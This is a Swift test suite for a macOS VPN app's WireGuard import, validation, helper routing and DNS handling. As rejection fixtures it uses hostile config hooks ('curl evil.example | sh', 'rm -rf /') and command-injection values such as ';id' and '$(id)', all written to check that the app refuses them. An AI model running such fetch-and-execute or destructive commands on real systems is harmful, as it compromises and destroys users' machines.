@testable import VPNApp
import Foundation
import Darwin
import CryptoKit
import VPNHelperCore
import VPNHelperShared

// WireGuard local checks. Synthetic profiles with RFC 7748 test keys; the network side of the
// helper runs against a recording host (no ifconfig, route or DNS change is made), and the
// real UAPI client talks to a socket served by this process. No VPN, no privileges.
@MainActor
enum WireGuardTests {
    nonisolated static func base64(_ hex: String) -> String {
        var bytes: [UInt8] = []
        var index = hex.startIndex
        while index < hex.endIndex {
            let next = hex.index(index, offsetBy: 2)
            bytes.append(UInt8(hex[index..<next], radix: 16)!)
            index = next
        }
        return Data(bytes).base64EncodedString()
    }
    /// RFC 7748 §6.1: Alice's private key and both public keys.
    nonisolated static let privateKey = base64("77076d0a7318a57d3c16c17251b26645df4c2f87ebc0992ab177fba51db92c2a")
    nonisolated static let publicKey = base64("8520f0098930a754748b7ddcb43ef75a0dbf3a0d26381af4eba4a98eaa9b4e6a")
    nonisolated static let serverKey = base64("de9edb7d7b7dc1b4d35b61c2ece435373f8343c85b78674dadfc7e146f882b4f")
    nonisolated static let presharedKey = Data(repeating: 7, count: 32).base64EncodedString()

    /// Shape of the file validated by hand: full tunnel (IPv4 and IPv6), DNS, MTU, PSK.
    nonisolated static var fullTunnel: String {
        """
        [Interface]
        PrivateKey = \(privateKey)
        Address = 10.8.0.3/32, fdcc:ad94:bacf:61a4::cafe:3/128
        MTU = 1420
        DNS = 1.1.1.1, 8.8.8.8

        [Peer]
        PublicKey = \(serverKey)
        PresharedKey = \(presharedKey)
        AllowedIPs = 0.0.0.0/0, ::/0
        PersistentKeepalive = 0
        Endpoint = 203.0.113.10:51820
        """
    }

    static func run() -> Int {
        var failures = 0
        func test(_ name: String, _ block: () throws -> Void) {
            do { try block(); print("PASS: WireGuard: \(name)") }
            catch { failures += 1; print("FAIL: WireGuard: \(name): \(error.localizedDescription)") }
        }
        let require = TestSupport.require
        let spin = TestSupport.spin
        func expectFailure(_ what: String, _ block: () throws -> Void) throws -> String {
            do { try block() } catch { return error.localizedDescription }
            throw TestSupport.Failure("\(what) foi aceito")
        }
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("VPNGUI-wireguard-tests-\(UUID())")
        try? FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: root) }
        let passwords = PasswordStore(service: "com.luiz.vpngui.tests.wireguard-password.\(UUID())")

        // MARK: Profile

        test("Perfil: túnel completo IPv4/IPv6 com DNS, MTU e PSK; texto canônico e ida e volta") {
            let profile = try WireGuardProfile.validated(fullTunnel)
            try require(profile.addresses.map(\.text) == ["10.8.0.3/32", "fdcc:ad94:bacf:61a4::cafe:3/128"], "Endereços: \(profile.addresses)")
            try require(profile.dnsServers == ["1.1.1.1", "8.8.8.8"] && profile.dnsSearch.isEmpty && profile.mtu == 1420, "DNS/MTU")
            let peer = profile.peers[0]
            try require(peer.endpoint == WireGuardEndpoint(host: "203.0.113.10", port: 51820) && peer.persistentKeepalive == nil
                        && peer.presharedKey == presharedKey, "Peer: \(peer)")
            try require(profile.routesAllIPv4 && profile.routesAllIPv6, "Túnel completo não detectado")
            try require(try WireGuardProfile.validated(profile.text) == profile, "Texto canônico não volta ao mesmo perfil")
            let tolerant = """
            # exportado pelo servidor
            [interface]
            privatekey=\(privateKey)   # comentário
            address = 10.0.0.2/24
            Address = fd00::2
            dns = 10.0.0.1, corp.example, Lab.Example
            Table = main
            ListenPort = 51000
            [PEER]
            PublicKey = \(serverKey)
            Endpoint = [2001:db8::1]:51820
            AllowedIPs = 10.0.0.0/24,192.168.10.0/24
            PersistentKeepalive = 25
            [Peer]
            PublicKey = \(publicKey)
            Endpoint = vpn.Example.invalid:443
            AllowedIPs = 172.16.0.0/12
            """
            let other = try WireGuardProfile.validated(tolerant)
            try require(other.addresses.map(\.text) == ["10.0.0.2/24", "fd00::2/128"] && other.dnsSearch == ["corp.example", "lab.example"]
                        && other.listenPort == 51000 && other.table == .auto, "Variações de sintaxe: \(other)")
            try require(other.peers[0].endpoint?.display == "[2001:db8::1]:51820" && other.peers[1].endpoint?.host == "vpn.example.invalid"
                        && other.peers[0].persistentKeepalive == 25, "Endpoints")
            try require(!other.routesAllIPv4 && !other.routesAllIPv6 && other.allowedIPs.count == 3, "Túnel parcial")
        }

        test("Perfil: hooks, SaveConfig e FwMark são removidos com aviso; o helper os recusa; chaves desconhecidas recusam a importação") {
            let hooked = fullTunnel.replacingOccurrences(of: "MTU = 1420", with: "MTU = 1420\nPostUp = curl evil.example | sh\nPreDown = rm -rf /\nSaveConfig = true\nFwMark = 51820")
            let imported = try WireGuardImporter.importText(hooked, suggestedName: "Casa", source: "")
            try require(imported.warnings.contains { $0.hasPrefix("PostUp removido") } && imported.warnings.contains { $0.hasPrefix("PreDown removido") }
                        && imported.warnings.contains { $0.hasPrefix("SaveConfig removido") } && imported.warnings.contains { $0.hasPrefix("FwMark removido") },
                        "Avisos: \(imported.warnings)")
            try require(!imported.profile.text.contains("PostUp") && !imported.profile.text.contains("curl"), "Hook ficou no perfil normalizado")
            _ = try expectFailure("Hook no helper") { _ = try WireGuardProfile.validated(hooked) }
            _ = try expectFailure("Chave desconhecida") { _ = try WireGuardImporter.importText(fullTunnel + "\nFoo = bar\n", suggestedName: "x", source: "") }
            _ = try expectFailure("Table numérica") { _ = try WireGuardProfile.validated(fullTunnel.replacingOccurrences(of: "MTU = 1420", with: "Table = 1234")) }
            _ = try expectFailure("Sem peer") { _ = try WireGuardProfile.validated("[Interface]\nPrivateKey = \(privateKey)\nAddress = 10.0.0.2/32\n") }
            _ = try expectFailure("Sem PrivateKey") { _ = try WireGuardProfile.validated(fullTunnel.replacingOccurrences(of: "PrivateKey = \(privateKey)", with: "")) }
            _ = try expectFailure("Chave curta") { _ = try WireGuardProfile.validated(fullTunnel.replacingOccurrences(of: serverKey, with: "abc=")) }
            _ = try expectFailure("Endereço com comando") { _ = try WireGuardProfile.validated(fullTunnel.replacingOccurrences(of: "10.8.0.3/32", with: "10.8.0.3/32;id")) }
            _ = try expectFailure("Endpoint com espaço") { _ = try WireGuardProfile.validated(fullTunnel.replacingOccurrences(of: "203.0.113.10:51820", with: "a b:1")) }
            _ = try expectFailure("Duas [Interface]") { _ = try WireGuardProfile.validated(fullTunnel + "\n[Interface]\n") }
            _ = try expectFailure("PublicKey repetida") { _ = try WireGuardProfile.validated(fullTunnel + "\n[Peer]\nPublicKey = \(serverKey)\n") }
            _ = try expectFailure("Opção de peer na interface") { _ = try WireGuardProfile.validated(fullTunnel.replacingOccurrences(of: "MTU = 1420", with: "Endpoint = 1.2.3.4:1")) }
            _ = try expectFailure("Perfil OpenVPN") { _ = try WireGuardImporter.importText(OpenVPNTests.viscosity, suggestedName: "x", source: "") }
        }

        test("UAPI: chaves em hexadecimal, endpoint resolvido, PSK, keepalive e AllowedIPs na ordem do protocolo") {
            var profile = try WireGuardProfile.validated(fullTunnel)
            profile.listenPort = 51000
            profile.peers[0].persistentKeepalive = 25
            let text = try profile.uapiConfiguration(endpoints: ["203.0.113.10:51820"])
            let expected = [
                "set=1", "private_key=77076d0a7318a57d3c16c17251b26645df4c2f87ebc0992ab177fba51db92c2a", "listen_port=51000", "replace_peers=true",
                "public_key=de9edb7d7b7dc1b4d35b61c2ece435373f8343c85b78674dadfc7e146f882b4f",
                "preshared_key=" + String(repeating: "07", count: 32), "endpoint=203.0.113.10:51820", "persistent_keepalive_interval=25",
                "replace_allowed_ips=true", "allowed_ip=0.0.0.0/0", "allowed_ip=::/0"].joined(separator: "\n") + "\n\n"
            try require(text == expected, "UAPI:\n\(text)")
            _ = try expectFailure("Endpoints a menos") { _ = try profile.uapiConfiguration(endpoints: []) }
        }

        test("Chave pública derivada da privada (RFC 7748) e igual à do wg, quando instalado") {
            try require(WireGuardImporter.publicKey(of: privateKey) == publicKey, "X25519 diferente do vetor da RFC 7748")
            let wg = BinaryLocator.homebrewPrefix + "/bin/wg"
            guard FileManager.default.isExecutableFile(atPath: wg) else { print("NOTE: wg não instalado; comparação pulada."); return }
            let generated = Curve25519.KeyAgreement.PrivateKey().rawRepresentation.base64EncodedString()
            let process = Process()
            process.executableURL = URL(fileURLWithPath: wg)
            process.arguments = ["pubkey"]
            let input = Pipe(), output = Pipe()
            process.standardInput = input; process.standardOutput = output
            try process.run()
            input.fileHandleForWriting.write(Data((generated + "\n").utf8))
            try input.fileHandleForWriting.close()
            let expected = String(decoding: output.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self).trimmingCharacters(in: .whitespacesAndNewlines)
            process.waitUntilExit()
            try require(WireGuardImporter.publicKey(of: generated) == expected, "Chave pública diferente do wg pubkey")
        }

        test("Importação de arquivo: original legível por outros gera aviso e fica intacto; pastas e vários arquivos são recusados") {
            let file = root.appendingPathComponent("Casa.conf")
            try fullTunnel.write(to: file, atomically: true, encoding: .utf8)
            chmod(file.path, 0o644)
            let before = try Data(contentsOf: file)
            let imported = try WireGuardImporter.load([file])
            try require(imported.name == "Casa" && imported.sourceFiles == [file.standardizedFileURL], "Nome/origem")
            try require(imported.warnings.contains { $0.contains("chave privada") } && imported.exposedOriginals.count == 1, "Sem aviso de permissão")
            try require(imported.summary.publicKey == publicKey && imported.summary.fullTunnel && imported.summary.endpoints == ["203.0.113.10:51820"], "Resumo")
            try require(try Data(contentsOf: file) == before, "Original alterado")
            chmod(file.path, 0o600)
            try require(try WireGuardImporter.load([file]).warnings.isEmpty, "Aviso com arquivo privado")
            _ = try expectFailure("Pasta") { _ = try WireGuardImporter.load([root]) }
            _ = try expectFailure("Dois arquivos") { _ = try WireGuardImporter.load([file, file]) }
        }

        // MARK: App

        test("Cadastro: perfil 0600 fora do JSON, sem senha no Keychain; edição mantém o perfil; exclusão o apaga") {
            let directory = root.appendingPathComponent("model-\(UUID())")
            let model = AppModel(store: try JSONStore(directory: directory), passwords: passwords, service: HelperTests.readyService())
            let imported = try WireGuardImporter.importText(fullTunnel, suggestedName: "Casa", source: "~/Downloads/Casa.conf")
            var connection = Connection(name: imported.name, kind: .wireguard)
            _ = try expectFailure("Sem perfil") { try model.save(connection, password: "") }
            connection.wireGuard = imported.summary
            try model.save(connection, password: "", wireGuardProfile: imported.profile.text)
            let file = directory.appendingPathComponent("WireGuard/\(connection.id.uuidString).conf")
            let fileMode = (try FileManager.default.attributesOfItem(atPath: file.path)[.posixPermissions] as? NSNumber)?.intValue
            let folderMode = (try FileManager.default.attributesOfItem(atPath: file.deletingLastPathComponent().path)[.posixPermissions] as? NSNumber)?.intValue
            try require(fileMode == 0o600 && folderMode == 0o700, "Permissões: \(String(describing: fileMode)) \(String(describing: folderMode))")
            let json = try String(contentsOf: directory.appendingPathComponent("connections.json"), encoding: .utf8)
            let escaped = { (key: String) in key.replacingOccurrences(of: "/", with: "\\/") }
            try require(!json.contains(escaped(privateKey)) && !json.contains(escaped(presharedKey)) && json.contains("\"kind\" : \"wireguard\""),
                        "connections.json com segredo ou sem o tipo")
            try require(try JSONStore(directory: directory).load().connections.first?.wireGuard?.publicKey == publicKey, "Resumo sem a chave pública")
            try require(try passwords.read(connection.id) == nil, "Senha gravada para WireGuard")
            try require(model.data.connections[0].endpoint == "203.0.113.10:51820" && !model.data.connections[0].usesPassword, "Resumo na lista")
            connection.name = "Casa 2"
            try model.save(connection, password: "")
            try require(try model.wireGuardProfiles?.read(connection.id) == imported.profile.text, "Edição perdeu o perfil")
            try require(try JSONStore(directory: directory).load().connections.first == model.data.connections.first, "Releitura diferente")
            try model.delete(model.data.connections[0])
            try require(!FileManager.default.fileExists(atPath: file.path), "Exclusão manteve a cópia com a chave privada")
        }

        test("Conectar: pedido com o perfil salvo; pronto marca conectado; falha de configuração termina em Falha sem nova tentativa") {
            let model = AppModel(store: try JSONStore(directory: root.appendingPathComponent("connect-\(UUID())")), passwords: passwords,
                                 service: HelperTests.readyService())
            var requests: [WireGuardRequest] = []
            model.manager.harness = VPNManager.LaunchHarness(help: SAMLCookieTests.help, launched: { _, _, _ in }, wireGuardLaunched: { session, request in
                requests.append(request)
                session.state = .connecting
            })
            let imported = try WireGuardImporter.importText(fullTunnel, suggestedName: "Casa", source: "")
            let connection = Connection(name: "Casa", kind: .wireguard, wireGuard: imported.summary)
            try model.save(connection, password: "", wireGuardProfile: imported.profile.text)
            model.connect(connection)
            try require(requests.count == 1 && requests[0].profile == imported.profile.text && requests[0].connectionID == connection.id, "Pedido")
            let session = model.manager.session(connection.id)
            try require(session.logs.contains { $0.contains("serviço do TunnelMac") }, "Log inicial: \(session.logs)")
            session.accept("DEBUG: (utun8) 2026/10/24 12:00:00 peer(3q2+…ydt8) - Sending handshake initiation", connection: connection) { _ in }
            try require(session.state == .connecting, "Linha do wireguard-go mudou o estado")
            session.accept("\(WireGuardMarkers.ready) em utun8.", connection: connection) { _ in }
            try require(session.state == .connected && session.connectedAt != nil && session.retryDelay == 10, "Pronto não marcou conectado")
            model.manager.disconnect(connection.id)
            model.manager.end(session, exit: 0)
            try require(session.state == .disconnected, "Desconexão normal virou falha: \(session.state)")
            model.connect(connection)
            session.accept("\(WireGuardMarkers.failure) route -q -n add -inet 0.0.0.0/1 -interface utun8 falhou (código 1).", connection: connection) { _ in }
            model.manager.end(session, exit: 0)
            try require(session.state == .failed && session.retryDelay == nil, "Falha de configuração: \(session.state)")
            try require(!session.logs.contains { $0.contains(privateKey) }, "Chave no log")
        }

        test("Serviço: pronto só com WireGuard aprovado; cada protocolo exige a sua cópia; Homebrew e caminhos") {
            let service = ServiceController(policy: .unavailable(reason: "verificações locais"), registrar: nil, client: nil)
            var status = HelperTests.readyStatus()
            let summary = status.runtime
            status.runtime = nil
            service.useForLocalChecks(status: status)
            if case .runtimeMissing = service.health {} else { throw TestSupport.Failure("Sem cliente não pediu aprovação") }
            status.wireGuardRuntime = summary
            service.useForLocalChecks(status: status)
            try require(service.health == .ready && service.unavailableReason(for: .wireguard) == nil, "WireGuard aprovado não liberou")
            try require(service.unavailableReason(for: .openvpn) != nil && service.unavailableReason(for: .openfortivpn) != nil, "Outros liberados")
            try require(RuntimeKind.wireguard.executableName == "wireguard-go" && RuntimeKind.allCases.count == 4, "Executável")
            try require(ServicePanel.presentation(.wireguard, .notInstalled).command == "brew install wireguard-go", "Comando de instalação")
            try require(ClientVersion.homebrewVersion(of: "/opt/homebrew/Cellar/wireguard-go/0.0.20250522/bin/wireguard-go") == "0.0.20250522", "Keg")
            try require(ClientState.evaluate(approved: "0.0.20250522", installed: "0.0.20250522", installedExists: true, sourceChanged: false,
                                             latest: "0.0.20250522") == .upToDate("0.0.20250522"), "Versão por data")
            let paths = BinaryLocator.candidates(environment: ["PATH": ""], name: "wireguard-go")
            try require(paths.contains("/opt/homebrew/bin/wireguard-go") && paths.contains("/usr/local/bin/wireguard-go"), "Caminhos: \(paths)")
        }

        // MARK: Helper

        test("netstat: rota padrão física, ignorando rotas com escopo, link# e utun") {
            let v4 = """
            Routing tables

            Internet:
            Destination        Gateway            Flags               Netif Expire
            0/1                utun8              USc                 utun8
            default            link#23            UCSIg               utun5
            default            192.168.18.1       UGScg                 en0
            """
            try require(WireGuardTools.defaultRoute(v4).map { "\($0.gateway) \($0.interface)" } == "192.168.18.1 en0", "IPv4")
            let v6 = """
            Internet6:
            Destination                             Gateway                                 Flags               Netif Expire
            default                                 fe80::%utun0                            UGcIg               utun0
            default                                 fe80::1%en0                             UGcg                  en0
            """
            try require(WireGuardTools.defaultRoute(v6).map { "\($0.gateway) \($0.interface)" } == "fe80::1%en0 en0", "IPv6")
            try require(WireGuardTools.defaultRoute("default  $(id)  UGSc  en0\ndefault 10.0.0.1%en0;x UGSc en0") == nil, "Gateway inválido aceito")
        }

        test("Supervisor: modo --wireguard executa só -f utun, sem o descritor de configuração, e recusa argumentos extras") {
            let script = root.appendingPathComponent("wg-args.sh")
            // /bin/sh itself may hold the script on fd 3; the configuration must not be there.
            try "#!/bin/sh\necho \"ARGS=$*\"\n/bin/cat /dev/fd/3 2>/dev/null | /usr/bin/grep -q 'CONFIG''MARKER' && echo FD3=config || echo FD3=none\n"
                .write(to: script, atomically: true, encoding: .utf8)
            chmod(script.path, 0o755)
            let run = try TestSupport.spawn(configText: "CONFIGMARKER\n", arguments: ["--wireguard", script.path])
            let output = try TestSupport.transcript(run)
            TestSupport.finish(run)
            try require(output.contains("ARGS=-f utun\n") && output.contains("FD3=none"), "Saída: \(output.suffix(200))")
            let extra = try TestSupport.spawn(arguments: ["--wireguard", script.path, "utun9"])
            let refused = try TestSupport.transcript(extra)
            TestSupport.finish(extra)
            try require(refused.contains("argumentos inválidos para wireguard-go") && !refused.contains("ARGS="), "Argumento extra aceito: \(refused)")
        }

        test("Helper: túnel de ponta a ponta com host simulado — UAPI, endereços, rotas 0/1, rota do endpoint, DNS e limpeza") {
            let host = RecordingWireGuardHost()
            host.dns["SERVICE-A"] = ["ServerAddresses": ["192.168.18.1"]]
            let fixture = try HelperFixture(listenerRequirement: HelperTests.ownRequirement, delegateRequirement: HelperTests.ownRequirement,
                                            wireGuardHost: host, wireGuardInterval: 0.2)
            defer { fixture.tearDown() }
            try fixture.installFixtureRuntime()
            try fixture.installFixtureWireGuardRuntime()
            let raw = RawClient(endpoint: fixture.listener.endpoint)
            defer { raw.invalidate() }
            guard case .status(let status)? = raw.send(.hello(HelloRequest(appVersion: HelperConstants.fullVersion))),
                  status.wireGuardRuntime?.version == "fixture-wg" else { throw TestSupport.Failure("Status sem o runtime WireGuard") }
            let profile = try WireGuardProfile.validated(fullTunnel).text
            let request = WireGuardRequest(connectionID: UUID(), profile: profile)
            guard case .started(let token, _)? = raw.send(.startWireGuard(request)) else { throw TestSupport.Failure("Sessão WireGuard não iniciou") }
            guard case .failure(let duplicate)? = raw.send(.startWireGuard(request)), duplicate.code == .duplicateSession else {
                throw TestSupport.Failure("Duplicata aceita")
            }
            let lines = { raw.received.flatMap(\.events).compactMap { event -> String? in if case .line(let l) = event.kind { return l }; return nil } }
            try require(spin(10) { lines().contains { $0.hasPrefix(WireGuardMarkers.ready) } }, "Túnel não ficou pronto: \(lines().suffix(8))")
            try require(spin(5) { lines().contains { $0.hasPrefix(WireGuardMarkers.handshake) } }, "Handshake não registrado")
            let pid = raw.received.flatMap(\.events).compactMap { event -> Int32? in if case .started(let pid) = event.kind { return pid }; return nil }.first
            let all = lines()
            try require(all.contains("ARGS=-f utun") && all.contains { $0.hasPrefix("ENV=") && $0.hasSuffix("|error") }, "Argumentos/ambiente: \(all.prefix(4))")
            try require(!all.contains { $0.hasPrefix("DEBUG:") }, "Linha DEBUG chegou ao log")
            let set = host.uapiRequests.first { $0.request.hasPrefix("set=1") }
            try require(set?.interface == "utun42" && set?.pid == pid && set?.request.contains("private_key=77076d0a") == true
                        && set?.request.contains("endpoint=203.0.113.10:51820") == true, "UAPI: \(String(describing: set))")
            let commands = host.commands
            for expected in ["ifconfig utun42 inet 10.8.0.3/32 10.8.0.3 alias", "ifconfig utun42 inet6 fdcc:ad94:bacf:61a4::cafe:3/128 alias",
                             "ifconfig utun42 mtu 1420", "ifconfig utun42 up",
                             "route -q -n add -inet 0.0.0.0/1 -interface utun42", "route -q -n add -inet 128.0.0.0/1 -interface utun42",
                             "route -q -n add -inet6 ::/1 -interface utun42", "route -q -n add -inet6 8000::/1 -interface utun42",
                             "route -q -n add -inet 203.0.113.10 -gateway 192.168.18.1"] {
                try require(commands.contains(expected), "Comando ausente: \(expected)\n\(commands.joined(separator: "\n"))")
            }
            try require(TunnelOrder.before("ifconfig utun42 up", "route -q -n add -inet 0.0.0.0/1 -interface utun42", in: commands), "Rotas antes do up")
            try require(TunnelServers.of(host.dns["SERVICE-A"]) == ["1.1.1.1", "8.8.8.8"], "DNS não aplicado: \(String(describing: host.dns["SERVICE-A"]))")
            try require(!all.contains { $0.contains("77076d0a") || $0.contains(privateKey) }, "Chave privada nos eventos")
            let record = fixture.store.wireGuardRecords + "/\(token).json"
            try require(FileManager.default.fileExists(atPath: record), "Registro de limpeza ausente")
            // A network change: the physical gateway changes and configd rewrites the DNS key.
            host.gateway4 = "10.1.1.1"
            host.dns["SERVICE-A"] = ["ServerAddresses": ["10.1.1.1"]]
            try require(spin(5) { host.commands.contains("route -q -n add -inet 203.0.113.10 -gateway 10.1.1.1")
                && TunnelServers.of(host.dns["SERVICE-A"]) == ["1.1.1.1", "8.8.8.8"] }, "Mudança de rede não tratada: \(host.commands.suffix(4))")
            _ = raw.send(.stop(token: token))
            try require(spin(10) { raw.received.flatMap(\.events).contains { $0.isTerminal } }, "Parada não confirmada")
            try require(spin(3) { lines().contains { $0.contains("Shutting down") } }, "wireguard-go de teste não recebeu SIGTERM: \(lines().suffix(10))")
            try require(host.commands.contains("route -q -n delete -inet 203.0.113.10 -gateway 10.1.1.1"), "Rota do endpoint não removida")
            try require(TunnelServers.of(host.dns["SERVICE-A"]) == ["10.1.1.1"], "DNS não restaurado: \(String(describing: host.dns["SERVICE-A"]))")
            try require(!FileManager.default.fileExists(atPath: record), "Registro de limpeza ficou")
            try require(((try? FileManager.default.contentsOfDirectory(atPath: fixture.store.work)) ?? []).allSatisfy { !$0.hasPrefix("wg.") }, "Arquivo de interface ficou")
            let tampered = WireGuardRequest(connectionID: UUID(), profile: profile + "PostUp = id\n")
            guard case .failure(let refused)? = raw.send(.startWireGuard(tampered)), refused.code == .invalidRequest else {
                throw TestSupport.Failure("Helper aceitou perfil com hook")
            }
        }

        test("Helper: rota recusada encerra a sessão com erro, sem DNS aplicado, e limpa o que já tinha feito") {
            let host = RecordingWireGuardHost()
            host.dns["SERVICE-A"] = ["ServerAddresses": ["192.168.18.1"]]
            host.failing = ["route -q -n add -inet6 ::/1"]
            let fixture = try HelperFixture(listenerRequirement: HelperTests.ownRequirement, delegateRequirement: HelperTests.ownRequirement,
                                            wireGuardHost: host, wireGuardInterval: 0.2)
            defer { fixture.tearDown() }
            try fixture.installFixtureRuntime()
            try fixture.installFixtureWireGuardRuntime()
            let raw = RawClient(endpoint: fixture.listener.endpoint)
            defer { raw.invalidate() }
            _ = raw.send(.hello(HelloRequest(appVersion: HelperConstants.fullVersion)))
            let hostname = fullTunnel.replacingOccurrences(of: "203.0.113.10:51820", with: "vpn.example.invalid:51820")
            guard case .started? = raw.send(.startWireGuard(WireGuardRequest(connectionID: UUID(), profile: try WireGuardProfile.validated(hostname).text))) else {
                throw TestSupport.Failure("Sessão não iniciou")
            }
            try require(spin(10) { raw.received.flatMap(\.events).contains { $0.isTerminal } }, "Sessão com falha não terminou")
            let lines = raw.received.flatMap(\.events).compactMap { event -> String? in if case .line(let l) = event.kind { return l }; return nil }
            try require(lines.contains { $0.hasPrefix(WireGuardMarkers.failure) && $0.contains("::/1") }, "Erro não informado: \(lines.suffix(5))")
            try require(!lines.contains { $0.hasPrefix(WireGuardMarkers.ready) }, "Ficou pronto apesar do erro")
            try require(host.uapiRequests.first?.request.contains("endpoint=198.51.100.7:51820") == true, "Nome do servidor não resolvido pelo helper")
            try require(TunnelServers.of(host.dns["SERVICE-A"]) == ["192.168.18.1"], "DNS mudou")
            try require(((try? FileManager.default.contentsOfDirectory(atPath: fixture.store.wireGuardRecords)) ?? []).isEmpty, "Registro ficou")
        }

        test("Recuperação: helper reiniciado desfaz rota e DNS de uma sessão que caiu; DNS alterado por outro é mantido") {
            let host = RecordingWireGuardHost()
            let rootPath = try HelperFixture.temporaryRoot()
            defer { try? FileManager.default.removeItem(atPath: rootPath) }
            let first = try HelperFixture(root: rootPath, listenerRequirement: nil, delegateRequirement: nil, wireGuardHost: host)
            first.tearDown(removeFiles: false)
            let original = try PropertyListSerialization.data(fromPropertyList: ["ServerAddresses": ["192.168.18.1"]], format: .binary, options: 0)
            func record(_ token: String, service: String) throws {
                let json: [String: Any] = ["token": token, "interface": "utun42",
                                           "routes": [["destination": "203.0.113.10", "ipv6": false, "gateway": "192.168.18.1"]],
                                           "dns": ["service": service, "original": original.base64EncodedString(), "servers": ["1.1.1.1"]]]
                let path = first.store.wireGuardRecords + "/\(token).json"
                guard FileManager.default.createFile(atPath: path, contents: try JSONSerialization.data(withJSONObject: json)), chmod(path, 0o600) == 0 else {
                    throw TestSupport.Failure("Registro")
                }
            }
            _ = host.run(WireGuardTools.route, ["-q", "-n", "add", "-inet", "203.0.113.10", "-gateway", "192.168.18.1"])
            try record("AAAA", service: "SERVICE-A")
            try record("BBBB", service: "SERVICE-B")
            host.dns["SERVICE-A"] = ["ServerAddresses": ["1.1.1.1"]]
            host.dns["SERVICE-B"] = ["ServerAddresses": ["9.9.9.9"]] // Changed by someone else since.
            let second = try HelperFixture(root: rootPath, listenerRequirement: nil, delegateRequirement: nil, wireGuardHost: host)
            defer { second.tearDown(removeFiles: false) }
            try require(spin(5) { ((try? FileManager.default.contentsOfDirectory(atPath: second.store.wireGuardRecords)) ?? []).isEmpty }, "Registros ficaram")
            try require(host.commands.filter { $0 == "route -q -n delete -inet 203.0.113.10 -gateway 192.168.18.1" }.count == 1, "Rotas não removidas: \(host.commands)")
            try require(TunnelServers.of(host.dns["SERVICE-A"]) == ["192.168.18.1"], "DNS da sessão caída não restaurado")
            try require(TunnelServers.of(host.dns["SERVICE-B"]) == ["9.9.9.9"], "DNS de outro programa sobrescrito")
        }

        test("Cliente UAPI real: socket servido por este processo, PID do peer conferido, pedido e resposta completos") {
            // Short path: sockaddr_un holds at most 104 bytes.
            var template = Array("/tmp/tm-wg-XXXXXX".utf8CString)
            guard let made = mkdtemp(&template), let real = realpath(made, nil) else { throw TestSupport.Failure("Diretório do socket") }
            let directory = String(cString: real); free(real)
            defer { try? FileManager.default.removeItem(atPath: directory) }
            let server = try UAPITestServer(path: directory + "/utun77.sock", reply: "last_handshake_time_sec=1\nerrno=0\n\n")
            defer { server.close() }
            let host = SystemWireGuardHost(uapiDirectory: directory)
            let reply = try host.uapi(interface: "utun77", pid: getpid(), request: "get=1\n\n")
            try require(reply == "last_handshake_time_sec=1\nerrno=0\n\n" && server.received == "get=1\n\n", "Resposta: \(reply)")
            _ = try expectFailure("PID de outro processo") { _ = try host.uapi(interface: "utun77", pid: 1, request: "get=1\n\n") }
            _ = try expectFailure("Interface inválida") { _ = try host.uapi(interface: "../x", pid: getpid(), request: "get=1\n\n") }
            try require(host.run("/bin/sh", ["-c", "id"]).status == -1, "Ferramenta fora da lista executada")
        }

        test("Runtime real do Homebrew: wireguard-go congelado, versão lida e nada carregado do prefixo gravável") {
            let candidate = BinaryLocator.defaultPath(for: .wireguard)
            guard FileManager.default.isExecutableFile(atPath: candidate) else {
                print("NOTE: wireguard-go não instalado em \(candidate); verificação do runtime real pulada.")
                return
            }
            let inventory = try RuntimeInspector.inspect(candidate: candidate, requester: getuid(), kind: .wireguard)
            try require(inventory.report.kind == .wireguard && inventory.report.items.count == 1 && inventory.report.items[0].role == .executable,
                        "Inventário: \(inventory.report.items.map(\.sourcePath))")
            let stateRoot = try HelperFixture.temporaryRoot()
            defer { try? FileManager.default.removeItem(atPath: stateRoot) }
            let store = RuntimeStore(root: stateRoot + "/state", ownership: TrustedOwnership(owners: [getuid()], anchor: stateRoot), probeIdentity: nil)
            let summary = try store.install(inventory, approvedBy: getuid())
            try require(summary.version.hasPrefix("0.0.") && summary.version != "desconhecida", "Versão: \(summary.version)")
            let active = try store.loadActive(.wireguard)
            try require(active.executable.hasSuffix("/bin/wireguard-go"), "Cópia: \(active.executable)")
            _ = try expectFailure("Runtime WireGuard como OpenVPN") { _ = try store.loadActive(.openvpn) }
            let process = Process()
            process.executableURL = URL(fileURLWithPath: active.executable)
            process.arguments = ["--version"]
            process.environment = ["PATH": "/usr/bin:/bin", "DYLD_PRINT_LIBRARIES": "1"]
            let pipe = Pipe()
            process.standardOutput = pipe; process.standardError = pipe
            try process.run()
            let output = String(decoding: pipe.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)
            process.waitUntilExit()
            try require(output.contains("wireguard-go v\(summary.version)"), "Cópia não executou --version: \(output.prefix(200))")
            for line in output.split(separator: "\n") where line.hasPrefix("dyld[") {
                try require(!line.contains("/opt/homebrew") && !line.contains("/usr/local/"), "Imagem do prefixo gravável: \(line)")
            }
            let copy = active.executable
            chmod(copy, 0o755)
            try Data("#!/bin/sh\nid\n".utf8).write(to: URL(fileURLWithPath: copy))
            chmod(copy, 0o555)
            _ = try expectFailure("Executável alterado") { _ = try store.loadActive(.wireguard) }
        }

        return failures
    }
}

enum TunnelServers {
    static func of(_ value: [String: Any]?) -> [String] { value?["ServerAddresses"] as? [String] ?? [] }
}

enum TunnelOrder {
    static func before(_ first: String, _ second: String, in commands: [String]) -> Bool {
        guard let a = commands.firstIndex(of: first), let b = commands.firstIndex(of: second) else { return false }
        return a < b
    }
}

/// Stands in for the system: records every command, answers netstat/ifconfig like macOS,
/// keeps the dynamic-store DNS keys in memory and serves UAPI with a fixed handshake.
final class RecordingWireGuardHost: WireGuardHost, @unchecked Sendable {
    private let lock = NSLock()
    private var _commands: [String] = []
    private var _uapi: [(interface: String, pid: pid_t, request: String)] = []
    private var _dns: [String: [String: Any]] = [:]
    private var routes: [String: String] = [:]
    private var _gateway4 = "192.168.18.1"
    var failing: [String] = []
    var primary: String? = "SERVICE-A"

    var commands: [String] { lock.withLock { _commands } }
    var uapiRequests: [(interface: String, pid: pid_t, request: String)] { lock.withLock { _uapi } }
    var dns: [String: [String: Any]] {
        get { lock.withLock { _dns } }
        set { lock.withLock { _dns = newValue } }
    }
    var gateway4: String {
        get { lock.withLock { _gateway4 } }
        set { lock.withLock { _gateway4 = newValue } }
    }

    func run(_ tool: String, _ arguments: [String]) -> CommandResult {
        let line = ([(tool as NSString).lastPathComponent] + arguments).joined(separator: " ")
        lock.withLock { _commands.append(line) }
